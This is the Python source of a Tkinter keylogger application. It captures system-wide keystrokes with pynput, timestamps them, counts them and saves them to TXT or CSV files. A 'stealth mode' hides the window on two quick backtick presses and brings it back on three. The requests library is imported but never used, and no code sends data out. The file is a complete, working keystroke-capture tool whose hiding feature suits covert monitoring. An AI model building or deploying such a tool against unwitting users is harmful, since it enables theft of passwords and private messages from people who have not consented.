import tkinter as tk
from tkinter import scrolledtext, filedialog
import threading
from pynput import keyboard
import csv
import time
import requests

class Keylogger:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("600x450")  # INCR. COUNTER DISPLAY
        
        # Theme
        self.root.configure(bg="#0F0F0F")
        
        self.is_logging = False
        self.logged_keys = []
        self.keystroke_count = 0  # Keystroke counter
        self.backtick_count = 0  
        self.last_backtick_time = 0  
        
        self.text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=70, height=15, bg="#1A1A1A", fg="#0FFF50", insertbackground="#0FFF50")
        self.text_area.pack(pady=10, fill=tk.BOTH, expand=True)
        
        # keystroke counter title class
        self.counter_label = tk.Label(root, text="Keystrokes: 0", fg="#00FFFF", bg="#0F0F0F", font=("Arial", 12, "bold"))
        self.counter_label.pack(pady=5)

        button_style = {"bg": "#222222", "fg": "#00FFFF", "activebackground": "#00FFFF", "relief": tk.GROOVE}
        
        self.button_frame = tk.Frame(root, bg="#0F0F0F")
        self.button_frame.pack(pady=10, fill=tk.X)
        
        #BUTTONS FOR GUI+FUNCTIONALITY
        self.start_button = tk.Button(self.button_frame, text="Start Logging", command=self.start_logging, **button_style)
        self.stop_button = tk.Button(self.button_frame, text="Stop Logging", command=self.stop_logging, state=tk.DISABLED, **button_style)
        self.save_txt_button = tk.Button(self.button_frame, text="Save as TXT", command=self.save_as_txt, **button_style)
        self.save_csv_button = tk.Button(self.button_frame, text="Save as CSV", command=self.save_as_csv, **button_style)
        self.clear_button = tk.Button(self.button_frame, text="Clear Logs", command=self.clear_logs, **button_style)
        
        self.start_button.pack(side=tk.LEFT, padx=10, pady=5, expand=True, fill=tk.X)
        self.stop_button.pack(side=tk.LEFT, padx=10, pady=5, expand=True, fill=tk.X)
        self.save_txt_button.pack(side=tk.LEFT, padx=10, pady=5, expand=True, fill=tk.X)
        self.save_csv_button.pack(side=tk.LEFT, padx=10, pady=5, expand=True, fill=tk.X)
        self.clear_button.pack(side=tk.LEFT, padx=10, pady=5, expand=True, fill=tk.X)
        
        self.root.bind("<Configure>", self.on_resize)
        
    def on_resize(self, event):
        for button in [self.start_button, self.stop_button, self.save_txt_button, self.save_csv_button, self.clear_button]:
            button.config(width=event.width // 20)
        
    def start_logging(self):
        self.is_logging = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        
    def stop_logging(self):
        self.is_logging = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        if hasattr(self, 'listener'):
            self.listener.stop()
    
    def on_press(self, key):
        if self.is_logging:
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
            try:
                key_char = key.char if key.char else str(key)
            except AttributeError:
                key_char = str(key)
            
            # Detect backtick (`) presses for stealth mode
            if key_char == '`':
                current_time = time.time()
                
                if current_time - self.last_backtick_time > 1:
                    self.backtick_count = 0
                
                self.backtick_count += 1
                self.last_backtick_time = current_time
                
                if self.backtick_count == 2: #TO HIDE 
                    self.hide_window()
                elif self.backtick_count == 3: #TO SHOW
                    self.show_window()
            
            entry = f"[{timestamp}] {key_char}"
            if entry not in self.logged_keys:
                self.logged_keys.append(entry)
                self.text_area.insert(tk.END, entry + "\n")
                self.text_area.see(tk.END)
                
                # UPDATE KEYSTROKE COUNTER
            
                self.keystroke_count += 1
                self.counter_label.config(text=f"Keystrokes: {self.keystroke_count}")

    def hide_window(self):
        """Hides the keylogger window."""
        self.root.withdraw()
    
    def show_window(self):
        """Restores the keylogger window."""
        self.root.deiconify()
    
    def save_as_txt(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, "w") as file:
                file.write("\n".join(self.logged_keys))
    
    def save_as_csv(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV files", "*.csv")])
        if file_path:
            with open(file_path, "w", newline='') as file:
                writer = csv.writer(file)
                writer.writerow(["Timestamp", "Key Pressed"])
                for entry in self.logged_keys:
                    writer.writerow(entry.strip("[]").split("] "))
    
    def clear_logs(self):
        self.logged_keys = []
        self.keystroke_count = 0  # Reset counter
        self.counter_label.config(text="Keystrokes: 0")  # Update label
        self.text_area.delete(1.0, tk.END)
        
if __name__ == "__main__":
    root = tk.Tk()
    app = Keylogger(root)
    root.mainloop()
